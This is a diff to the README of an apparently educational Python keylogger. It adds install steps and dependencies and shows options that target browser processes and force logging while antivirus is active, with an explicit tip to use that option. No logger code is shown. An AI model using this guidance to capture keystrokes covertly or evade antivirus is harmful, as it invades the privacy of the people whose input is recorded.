@@ -9,12 +9,24 @@ This is an educational purpose keylogger.
 - [ ] Acquire logs from remote.
 
 ## Installation
-Execute:  `pip install -r requirements.txt`
+1. Clone the repository:
+```
+git clone https://github.com/antoninoLorenzo/kilogger.git
+```
+
+2. Install dependencies:
+```
+cd kilogger && pip install -r requirements.txt
+```
+
+**Dependencies**
+- pynput
+- psutil
 
 ## Usage
 **Run**
 ```
-python -m kilogger.cli [ARGS]
+python kilogger.py [ARGS]
 ```
 
 **Help**
@@ -27,6 +39,8 @@ options:
   --force {0,1}      0: do not force logger if AV is on. 1: fuck it
   --targets TARGETS  Name of target processes (ex. "chrome.exe, firefox.exe"); note: process names should be separated by ", ".
 ```
+
+*PS: if the antivirus is on use:* `--force 1`
 
 ## AV Detection
 On [VirusTotal](https://www.virustotal.com/gui/home/upload) the score for `cli.py` file is the following:
